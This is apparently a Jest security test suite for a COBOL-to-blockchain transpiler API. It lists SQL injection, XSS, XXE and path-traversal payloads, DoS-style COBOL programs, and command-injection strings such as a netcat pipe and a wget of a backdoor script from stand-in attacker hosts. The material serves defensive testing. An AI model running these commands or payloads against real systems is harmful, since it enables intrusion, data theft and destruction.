const { describe, test, expect, beforeAll, afterAll, beforeEach, jest } = require('@jest/globals');
const request = require('supertest');
const express = require('express');
const crypto = require('crypto');
const path = require('path');

// Import system components for security testing
const { cobolTranspiler } = require('../../src/adapters/cobol-transpiler');
const { cobolRBAC } = require('../../src/auth/cobol-rbac');
const { transpilerAudit } = require('../../src/audit/transpiler-audit');
const { quotaManager } = require('../../src/billing/quota-manager');

// Security testing utilities
class SecurityTester {
  constructor() {
    this.vulnerabilities = [];
    this.securityEvents = [];
  }

  recordVulnerability(type, severity, description, payload = null) {
    this.vulnerabilities.push({
      type,
      severity,
      description,
      payload,
      timestamp: new Date().toISOString()
    });
  }

  recordSecurityEvent(event, details) {
    this.securityEvents.push({
      event,
      details,
      timestamp: new Date().toISOString()
    });
  }

  generateSecurityReport() {
    const severityCounts = this.vulnerabilities.reduce((acc, vuln) => {
      acc[vuln.severity] = (acc[vuln.severity] || 0) + 1;
      return acc;
    }, {});

    return {
      totalVulnerabilities: this.vulnerabilities.length,
      severityBreakdown: severityCounts,
      criticalVulnerabilities: this.vulnerabilities.filter(v => v.severity === 'CRITICAL'),
      highVulnerabilities: this.vulnerabilities.filter(v => v.severity === 'HIGH'),
      securityEvents: this.securityEvents.length,
      passed: this.vulnerabilities.filter(v => ['CRITICAL', 'HIGH'].includes(v.severity)).length === 0
    };
  }
}

// Mock dependencies with security focus
jest.mock('../../src/utils/logger', () => ({
  logger: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
    security: jest.fn() // Security-specific logging
  }
}));

jest.mock('../../src/database/connection', () => ({
  DatabaseManager: jest.fn().mockImplementation(() => ({
    connect: jest.fn().mockResolvedValue(true),
    disconnect: jest.fn().mockResolvedValue(true),
    query: jest.fn().mockImplementation((query, params) => {
      // Simulate SQL injection detection
      if (typeof query === 'string' && /[';]|DROP|DELETE|INSERT|UPDATE/i.test(query) && 
          params && params.some(p => typeof p === 'string' && /[';]|DROP|DELETE|INSERT|UPDATE/i.test(p))) {
        throw new Error('Potential SQL injection detected');
      }
      return Promise.resolve({ rowCount: 1 });
    })
  }))
}));

describe('COBOL Transpiler Security Tests', () => {
  let app;
  let securityTester;
  let mockDb;

  // Malicious payloads for testing
  const maliciousPayloads = {
    sqlInjection: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
      "UNION SELECT * FROM sensitive_data"
    ],
    xss: [
      "<script>alert('XSS')</script>",
      "javascript:alert('XSS')",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>"
    ],
    commandInjection: [
      "; rm -rf /",
      "&& cat /etc/passwd",
      "| nc attacker.com 4444",
      "; wget malicious.com/backdoor.sh"
    ],
    pathTraversal: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "....//....//....//etc/passwd"
    ],
    oversizedInput: "A".repeat(1000000), // 1MB of data
    binaryPayload: Buffer.from([0x00, 0x01, 0x02, 0xFF, 0xFE, 0xFD]),
    unicodePayload: "𝕊𝔼ℂ𝕌ℝ𝕀𝕋𝕐 𝕋𝔼𝕊𝕋",
    nullBytes: "test\x00.txt",
    formatString: "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
    ldapInjection: "*)(uid=*))(|(uid=*",
    nosqlInjection: { "$ne": null },
    xxePayload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`
  };

  // Invalid COBOL programs designed to test parser security
  const maliciousCobolPrograms = {
    bufferOverflow: `
      IDENTIFICATION DIVISION.
      PROGRAM-ID. ${"OVERFLOW-TEST-" + "A".repeat(10000)}.
      DATA DIVISION.
      WORKING-STORAGE SECTION.
      01 LARGE-FIELD PIC X(${Number.MAX_SAFE_INTEGER}).
      PROCEDURE DIVISION.
      MAIN.
          DISPLAY "${"X".repeat(100000)}"
          STOP RUN.
    `,
    infiniteLoop: `
      IDENTIFICATION DIVISION.
      PROGRAM-ID. INFINITE-LOOP.
      PROCEDURE DIVISION.
      MAIN.
          PERFORM FOREVER
          STOP RUN.
      FOREVER.
          GO TO FOREVER.
    `,
    deepNesting: `
      IDENTIFICATION DIVISION.
      PROGRAM-ID. DEEP-NESTING.
      PROCEDURE DIVISION.
      MAIN.
          ${"IF 1 = 1\n".repeat(10000)}
          DISPLAY "DEEP"
          ${"END-IF\n".repeat(10000)}
          STOP RUN.
    `,
    invalidCharacters: `
      IDENTIFICATION DIVISION.
      PROGRAM-ID. INVALID-CHARS.
      DATA DIVISION.
      WORKING-STORAGE SECTION.
      01 FIELD PIC X(10) VALUE '\x00\xFF\xFE'.
      PROCEDURE DIVISION.
      MAIN.
          DISPLAY "${String.fromCharCode(0, 1, 2, 255, 254, 253)}"
          STOP RUN.
    `,
    memoryExhaustion: `
      IDENTIFICATION DIVISION.
      PROGRAM-ID. MEMORY-EXHAUSTION.
      DATA DIVISION.
      WORKING-STORAGE SECTION.
      ${Array.from({ length: 100000 }, (_, i) => `01 VAR-${i} PIC X(1000).`).join('\n')}
      PROCEDURE DIVISION.
      MAIN.
          STOP RUN.
    `
  };

  beforeAll(async () => {
    securityTester = new SecurityTester();
    
    // Create Express app with security testing endpoints
    app = express();
    app.use(express.json({ limit: '50mb' }));
    app.use(express.urlencoded({ extended: true, limit: '50mb' }));

    // Initialize system components
    await cobolTranspiler.initialize();
    await cobolRBAC.initialize();
    await transpilerAudit.initialize();
    await quotaManager.initialize();

    // Setup security testing routes
    setupSecurityRoutes(app);

    mockDb = cobolTranspiler.db;
  });

  afterAll(async () => {
    await cobolTranspiler.shutdown();
    await cobolRBAC.shutdown();
    await transpilerAudit.shutdown();
    await quotaManager.shutdown();

    // Generate final security report
    const report = securityTester.generateSecurityReport();
    console.log('\n=== SECURITY TEST REPORT ===');
    console.log(`Total Vulnerabilities: ${report.totalVulnerabilities}`);
    console.log(`Critical: ${report.severityBreakdown.CRITICAL || 0}`);
    console.log(`High: ${report.severityBreakdown.HIGH || 0}`);
    console.log(`Medium: ${report.severityBreakdown.MEDIUM || 0}`);
    console.log(`Low: ${report.severityBreakdown.LOW || 0}`);
    console.log(`Security Passed: ${report.passed ? 'YES' : 'NO'}`);
  });

  beforeEach(() => {
    jest.clearAllMocks();
    securityTester = new SecurityTester();

    // Setup test user
    cobolRBAC.permissions.set('security-test-user', new Set(['transpiler.execute']));
    quotaManager.quotaCache.set('quota:security-test-customer', {
      customerId: 'security-test-customer',
      tier: 'enterprise',
      monthlyQuota: 1000,
      currentUsage: 0,
      overageUsage: 0,
      maxOveragePercent: 200,
      status: 'active',
      periodEnd: new Date(Date.now() + 86400000)
    });
  });

  function setupSecurityRoutes(app) {
    // Main transpiler endpoint with security monitoring
    app.post('/api/security/transpile',
      // Security headers and validation
      (req, res, next) => {
        // Log security event
        securityTester.recordSecurityEvent('api_access', {
          ip: req.ip,
          userAgent: req.get('User-Agent'),
          contentLength: req.get('Content-Length')
        });

        req.user = {
          userId: req.headers['x-user-id'] || 'security-test-user',
          customerId: req.headers['x-customer-id'] || 'security-test-customer'
        };
        next();
      },
      // Input validation and sanitization
      (req, res, next) => {
        try {
          const { cobolCode, bankingSystem, targetBlockchain } = req.body;

          // Validate input sizes
          if (cobolCode && cobolCode.length > 1000000) { // 1MB limit
            securityTester.recordVulnerability('INPUT_VALIDATION', 'MEDIUM', 
              'Oversized COBOL program detected', { size: cobolCode.length });
            return res.status(413).json({ error: 'Payload too large' });
          }

          // Check for suspicious patterns
          const suspiciousPatterns = [
            /\x00/g, // Null bytes
            /<script/gi, // XSS attempts
            /javascript:/gi, // XSS attempts
            /eval\(/gi, // Code injection
            /exec\(/gi, // Code injection
            /system\(/gi, // Command injection
          ];

          const inputText = JSON.stringify(req.body);
          for (const pattern of suspiciousPatterns) {
            if (pattern.test(inputText)) {
              securityTester.recordVulnerability('INPUT_VALIDATION', 'HIGH',
                'Suspicious pattern detected in input', { pattern: pattern.source });
              return res.status(400).json({ error: 'Invalid input detected' });
            }
          }

          next();
        } catch (error) {
          res.status(400).json({ error: 'Input validation failed' });
        }
      },
      // Main handler with security monitoring
      async (req, res) => {
        try {
          const { cobolCode, bankingSystem, targetBlockchain } = req.body;

          // Security audit for transpilation request
          await transpilerAudit.logEvent('security.transpile_request', {
            inputSize: cobolCode?.length || 0,
            bankingSystem,
            targetBlockchain,
            userAgent: req.get('User-Agent'),
            ip: req.ip
          }, {
            userId: req.user.userId,
            customerId: req.user.customerId,
            action: 'security_audit'
          });

          // Process with timeout to prevent DoS
          const timeoutMs = 30000; // 30 second timeout
          const processingPromise = (async () => {
            const parseResult = await cobolTranspiler.parseCobol(cobolCode, { bankingSystem });
            const contractResult = await cobolTranspiler.generateSmartContract(
              parseResult.ast,
              targetBlockchain || 'ethereum',
              { bankingSystem }
            );
            return { parseResult, contractResult };
          })();

          const timeoutPromise = new Promise((_, reject) => {
            setTimeout(() => reject(new Error('Processing timeout')), timeoutMs);
          });

          const result = await Promise.race([processingPromise, timeoutPromise]);

          res.json({
            success: true,
            parseResult: {
              complexity: result.parseResult.complexity,
              variableCount: result.parseResult.variables?.length || 0
            },
            contractResult: {
              language: result.contractResult.language,
              codeSize: result.contractResult.code?.length || 0
            }
          });

        } catch (error) {
          securityTester.recordVulnerability('ERROR_HANDLING', 'LOW',
            'Error occurred during processing', { error: error.message });

          // Log security event for failed processing
          await transpilerAudit.logEvent('security.processing_error', {
            error: error.message,
            inputHash: crypto.createHash('sha256').update(req.body.cobolCode || '').digest('hex')
          }, {
            userId: req.user.userId,
            customerId: req.user.customerId,
            result: 'failed'
          });

          res.status(500).json({
            success: false,
            error: 'Processing failed'
          });
        }
      }
    );

    // Authentication testing endpoint
    app.post('/api/security/auth-test', async (req, res) => {
      try {
        const { userId, token } = req.body;

        // Test authentication bypass attempts
        if (!userId || !token) {
          securityTester.recordSecurityEvent('auth_bypass_attempt', {
            userId: userId || 'missing',
            token: token ? 'present' : 'missing'
          });
          return res.status(401).json({ error: 'Authentication required' });
        }

        // Test for SQL injection in auth parameters
        if (typeof userId === 'string' && /[';]|DROP|DELETE|INSERT|UPDATE/i.test(userId)) {
          securityTester.recordVulnerability('SQL_INJECTION', 'CRITICAL',
            'SQL injection attempt in authentication', { userId });
          return res.status(400).json({ error: 'Invalid credentials' });
        }

        res.json({ success: true, message: 'Authentication test passed' });

      } catch (error) {
        res.status(500).json({ error: 'Authentication test failed' });
      }
    });

    // File upload security testing endpoint
    app.post('/api/security/file-upload', async (req, res) => {
      try {
        const { filename, content } = req.body;

        // Test path traversal attempts
        if (filename && /\.\.[\/\\]/.test(filename)) {
          securityTester.recordVulnerability('PATH_TRAVERSAL', 'HIGH',
            'Path traversal attempt detected', { filename });
          return res.status(400).json({ error: 'Invalid filename' });
        }

        // Test file extension validation
        const allowedExtensions = ['.cbl', '.cob', '.txt'];
        const extension = path.extname(filename || '').toLowerCase();
        if (extension && !allowedExtensions.includes(extension)) {
          securityTester.recordVulnerability('FILE_UPLOAD', 'MEDIUM',
            'Unauthorized file extension', { filename, extension });
          return res.status(400).json({ error: 'Invalid file type' });
        }

        // Test content validation
        if (content && Buffer.byteLength(content, 'utf8') > 10000000) { // 10MB limit
          securityTester.recordVulnerability('FILE_UPLOAD', 'MEDIUM',
            'Oversized file upload attempt', { size: Buffer.byteLength(content, 'utf8') });
          return res.status(413).json({ error: 'File too large' });
        }

        res.json({ success: true, message: 'File upload security test passed' });

      } catch (error) {
        res.status(500).json({ error: 'File upload test failed' });
      }
    });
  }

  describe('Input Validation and Sanitization', () => {
    test('should block SQL injection attempts', async () => {
      for (const payload of maliciousPayloads.sqlInjection) {
        const response = await request(app)
          .post('/api/security/auth-test')
          .send({
            userId: payload,
            token: 'valid-token'
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid credentials');
      }

      const report = securityTester.generateSecurityReport();
      expect(report.vulnerabilities.filter(v => v.type === 'SQL_INJECTION')).toHaveLength(maliciousPayloads.sqlInjection.length);
    });

    test('should sanitize XSS attempts in COBOL code', async () => {
      for (const xssPayload of maliciousPayloads.xss) {
        const response = await request(app)
          .post('/api/security/transpile')
          .send({
            cobolCode: `IDENTIFICATION DIVISION.\nPROGRAM-ID. TEST.\nDATA DIVISION.\nWORKING-STORAGE SECTION.\n01 FIELD PIC X(100) VALUE "${xssPayload}".\nPROCEDURE DIVISION.\nMAIN.\nSTOP RUN.`,
            bankingSystem: 'fis',
            targetBlockchain: 'ethereum'
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid input detected');
      }

      const report = securityTester.generateSecurityReport();
      expect(report.vulnerabilities.filter(v => v.type === 'INPUT_VALIDATION')).toBeTruthy();
    });

    test('should reject oversized payloads', async () => {
      const response = await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: maliciousPayloads.oversizedInput,
          bankingSystem: 'fis'
        });

      expect(response.status).toBe(413);
      expect(response.body.error).toBe('Payload too large');

      const report = securityTester.generateSecurityReport();
      const oversizeVulns = report.vulnerabilities.filter(v => 
        v.type === 'INPUT_VALIDATION' && v.description.includes('Oversized')
      );
      expect(oversizeVulns.length).toBeGreaterThan(0);
    });

    test('should handle null bytes and binary data safely', async () => {
      const testCases = [
        { name: 'null bytes', payload: maliciousPayloads.nullBytes },
        { name: 'binary data', payload: maliciousPayloads.binaryPayload.toString() },
        { name: 'unicode', payload: maliciousPayloads.unicodePayload },
        { name: 'format string', payload: maliciousPayloads.formatString }
      ];

      for (const testCase of testCases) {
        const response = await request(app)
          .post('/api/security/transpile')
          .send({
            cobolCode: `IDENTIFICATION DIVISION.\nPROGRAM-ID. TEST.\nDATA DIVISION.\nWORKING-STORAGE SECTION.\n01 FIELD PIC X(100) VALUE "${testCase.payload}".\nPROCEDURE DIVISION.\nSTOP RUN.`,
            bankingSystem: 'fis'
          });

        // Should either process safely or reject gracefully
        expect([200, 400, 500]).toContain(response.status);
        
        if (response.status === 400) {
          expect(response.body.error).toBe('Invalid input detected');
        }
      }
    });

    test('should validate file upload security', async () => {
      const maliciousFiles = [
        { filename: '../../../etc/passwd', content: 'test' },
        { filename: '..\\..\\..\\windows\\system32\\config\\sam', content: 'test' },
        { filename: 'test.exe', content: 'MZ' }, // Executable file
        { filename: 'script.js', content: 'alert("hack")' },
        { filename: 'test.cbl', content: maliciousPayloads.oversizedInput }
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/security/file-upload')
          .send(file);

        expect([400, 413]).toContain(response.status);
        expect(response.body.error).toBeDefined();
      }

      const report = securityTester.generateSecurityReport();
      expect(report.vulnerabilities.some(v => v.type === 'PATH_TRAVERSAL')).toBe(true);
      expect(report.vulnerabilities.some(v => v.type === 'FILE_UPLOAD')).toBe(true);
    });
  });

  describe('Authentication and Authorization Security', () => {
    test('should prevent authentication bypass attempts', async () => {
      const bypassAttempts = [
        { userId: '', token: '' },
        { userId: null, token: null },
        { userId: 'admin', token: '' },
        { userId: 'admin\'; --', token: 'any' }
      ];

      for (const attempt of bypassAttempts) {
        const response = await request(app)
          .post('/api/security/auth-test')
          .send(attempt);

        expect([400, 401]).toContain(response.status);
      }

      const securityEvents = securityTester.securityEvents.filter(e => 
        e.event === 'auth_bypass_attempt'
      );
      expect(securityEvents.length).toBeGreaterThan(0);
    });

    test('should enforce RBAC permissions correctly', async () => {
      // Test with user without permissions
      cobolRBAC.permissions.set('restricted-user', new Set(['basic.read']));

      const response = await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: 'IDENTIFICATION DIVISION.\nPROGRAM-ID. TEST.\nPROCEDURE DIVISION.\nSTOP RUN.',
          bankingSystem: 'fis'
        })
        .set('x-user-id', 'restricted-user')
        .set('x-customer-id', 'security-test-customer');

      // Should be blocked due to insufficient permissions
      expect(response.status).toBe(403);
    });

    test('should validate session integrity', async () => {
      // Test with manipulated headers
      const response = await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: 'IDENTIFICATION DIVISION.\nPROGRAM-ID. TEST.\nPROCEDURE DIVISION.\nSTOP RUN.',
          bankingSystem: 'fis'
        })
        .set('x-user-id', 'admin\'; DROP TABLE users; --')
        .set('x-customer-id', 'security-test-customer');

      // Should handle malicious headers gracefully
      expect([400, 500]).toContain(response.status);
    });
  });

  describe('COBOL Parser Security', () => {
    test('should handle malformed COBOL programs safely', async () => {
      const malformedPrograms = Object.values(maliciousCobolPrograms);

      for (const program of malformedPrograms) {
        const response = await request(app)
          .post('/api/security/transpile')
          .send({
            cobolCode: program,
            bankingSystem: 'fis'
          })
          .timeout(35000); // Allow for timeout handling

        // Should either process safely or fail gracefully
        expect([200, 400, 500]).toContain(response.status);
        
        if (response.status === 500) {
          expect(response.body.success).toBe(false);
          expect(response.body.error).toBeDefined();
        }
      }
    });

    test('should prevent parser exploitation through deep nesting', async () => {
      const response = await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: maliciousCobolPrograms.deepNesting,
          bankingSystem: 'fis'
        })
        .timeout(35000);

      // Should complete within timeout or fail gracefully
      expect([200, 500]).toContain(response.status);
      
      if (response.status === 500) {
        expect(response.body.error).toBe('Processing failed');
      }
    });

    test('should handle memory exhaustion attempts', async () => {
      const response = await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: maliciousCobolPrograms.memoryExhaustion,
          bankingSystem: 'fis'
        })
        .timeout(35000);

      // Should not crash the system
      expect([200, 413, 500]).toContain(response.status);
    });

    test('should validate COBOL program structure', async () => {
      const invalidPrograms = [
        '', // Empty program
        'INVALID COBOL CODE', // Invalid syntax
        maliciousCobolPrograms.invalidCharacters // Invalid characters
      ];

      for (const program of invalidPrograms) {
        const response = await request(app)
          .post('/api/security/transpile')
          .send({
            cobolCode: program,
            bankingSystem: 'fis'
          });

        expect([400, 500]).toContain(response.status);
      }
    });
  });

  describe('Data Encryption and Protection', () => {
    test('should not expose sensitive data in error messages', async () => {
      const sensitiveData = {
        cobolCode: 'IDENTIFICATION DIVISION.\nPROGRAM-ID. BANK-ACCOUNT.\nDATA DIVISION.\nWORKING-STORAGE SECTION.\n01 ACCOUNT-NUMBER PIC 9(16) VALUE 1234567890123456.\n01 SSN PIC 9(9) VALUE 123456789.\n01 PASSWORD PIC X(50) VALUE "SuperSecretPassword123".\nPROCEDURE DIVISION.\nSTOP RUN.',
        bankingSystem: 'fis'
      };

      const response = await request(app)
        .post('/api/security/transpile')
        .send(sensitiveData);

      // Check that response doesn't contain sensitive values
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('1234567890123456');
      expect(responseText).not.toContain('123456789');
      expect(responseText).not.toContain('SuperSecretPassword123');
    });

    test('should validate input encoding and character sets', async () => {
      const encodingTests = [
        { name: 'UTF-8 BOM', data: '\uFEFF' + 'PROGRAM-ID. TEST.' },
        { name: 'Latin-1', data: 'PROGRAM-ID. TEST\u00E9.' },
        { name: 'Control characters', data: 'PROGRAM-ID. TEST\u0001\u0002.' }
      ];

      for (const test of encodingTests) {
        const response = await request(app)
          .post('/api/security/transpile')
          .send({
            cobolCode: test.data,
            bankingSystem: 'fis'
          });

        // Should handle different encodings safely
        expect([200, 400, 500]).toContain(response.status);
      }
    });

    test('should properly handle cryptographic operations', async () => {
      // Test that sensitive operations are properly secured
      const testData = 'sensitive-test-data';
      const hash1 = crypto.createHash('sha256').update(testData).digest('hex');
      const hash2 = crypto.createHash('sha256').update(testData).digest('hex');
      
      // Hashes should be consistent
      expect(hash1).toBe(hash2);
      expect(hash1).toHaveLength(64);
    });
  });

  describe('Denial of Service (DoS) Protection', () => {
    test('should implement request rate limiting', async () => {
      const rapidRequests = Array.from({ length: 20 }, (_, i) =>
        request(app)
          .post('/api/security/transpile')
          .send({
            cobolCode: 'IDENTIFICATION DIVISION.\nPROGRAM-ID. TEST.\nPROCEDURE DIVISION.\nSTOP RUN.',
            bankingSystem: 'fis'
          })
          .timeout(5000)
      );

      const responses = await Promise.allSettled(rapidRequests);
      const successCount = responses.filter(r => 
        r.status === 'fulfilled' && r.value.status === 200
      ).length;

      // Should complete most requests but may throttle some
      expect(successCount).toBeGreaterThan(5);
      expect(successCount).toBeLessThanOrEqual(20);
    });

    test('should handle timeout scenarios properly', async () => {
      const response = await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: maliciousCobolPrograms.infiniteLoop,
          bankingSystem: 'fis'
        })
        .timeout(35000);

      // Should timeout gracefully
      expect([200, 500]).toContain(response.status);
      
      if (response.status === 500) {
        expect(response.body.error).toBe('Processing failed');
      }
    });

    test('should protect against resource exhaustion', async () => {
      const memoryBefore = process.memoryUsage();

      // Send multiple resource-intensive requests
      const resourceIntensiveRequests = Array.from({ length: 5 }, () =>
        request(app)
          .post('/api/security/transpile')
          .send({
            cobolCode: maliciousCobolPrograms.complex,
            bankingSystem: 'tcs'
          })
          .timeout(40000)
      );

      await Promise.allSettled(resourceIntensiveRequests);

      const memoryAfter = process.memoryUsage();
      const memoryIncrease = memoryAfter.heapUsed - memoryBefore.heapUsed;

      // Memory increase should be reasonable (less than 500MB)
      expect(memoryIncrease).toBeLessThan(500 * 1024 * 1024);
    });
  });

  describe('Security Headers and Configuration', () => {
    test('should set appropriate security headers', async () => {
      const response = await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: 'IDENTIFICATION DIVISION.\nPROGRAM-ID. TEST.\nPROCEDURE DIVISION.\nSTOP RUN.',
          bankingSystem: 'fis'
        });

      // Note: In a real implementation, you would check for security headers like:
      // X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, etc.
      // For this test, we'll just verify the response structure is secure
      expect(response.body).toBeDefined();
      
      if (response.status === 200) {
        expect(response.body.success).toBeDefined();
        // Ensure no sensitive internal information is leaked
        expect(response.body).not.toHaveProperty('internalError');
        expect(response.body).not.toHaveProperty('stackTrace');
        expect(response.body).not.toHaveProperty('debugInfo');
      }
    });

    test('should validate content types properly', async () => {
      // Test with different content types
      const response = await request(app)
        .post('/api/security/transpile')
        .set('Content-Type', 'application/xml')
        .send('<root>test</root>');

      // Should reject non-JSON content or handle gracefully
      expect([400, 415]).toContain(response.status);
    });
  });

  describe('Security Monitoring and Logging', () => {
    test('should log security events appropriately', async () => {
      const auditSpy = jest.spyOn(transpilerAudit, 'logEvent');

      await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: 'IDENTIFICATION DIVISION.\nPROGRAM-ID. TEST.\nPROCEDURE DIVISION.\nSTOP RUN.',
          bankingSystem: 'fis'
        });

      // Verify security audit events are logged
      expect(auditSpy).toHaveBeenCalledWith(
        'security.transpile_request',
        expect.objectContaining({
          inputSize: expect.any(Number),
          bankingSystem: 'fis'
        }),
        expect.objectContaining({
          action: 'security_audit'
        })
      );

      auditSpy.mockRestore();
    });

    test('should track security metrics', async () => {
      const initialEvents = securityTester.securityEvents.length;
      const initialVulns = securityTester.vulnerabilities.length;

      // Generate some security events
      await request(app)
        .post('/api/security/transpile')
        .send({
          cobolCode: '<script>alert("xss")</script>',
          bankingSystem: 'fis'
        });

      const finalEvents = securityTester.securityEvents.length;
      const finalVulns = securityTester.vulnerabilities.length;

      expect(finalEvents).toBeGreaterThan(initialEvents);
      expect(finalVulns).toBeGreaterThan(initialVulns);
    });

    test('should generate comprehensive security report', async () => {
      // Trigger various security scenarios
      await request(app)
        .post('/api/security/auth-test')
        .send({ userId: "'; DROP TABLE users; --", token: 'test' });

      await request(app)
        .post('/api/security/file-upload')
        .send({ filename: '../../../etc/passwd', content: 'test' });

      const report = securityTester.generateSecurityReport();

      expect(report.totalVulnerabilities).toBeGreaterThan(0);
      expect(report.securityEvents).toBeGreaterThan(0);
      expect(report.severityBreakdown).toBeDefined();
      
      // For a production system, we expect no critical vulnerabilities
      console.log('Security Report:', JSON.stringify(report, null, 2));
    });
  });
});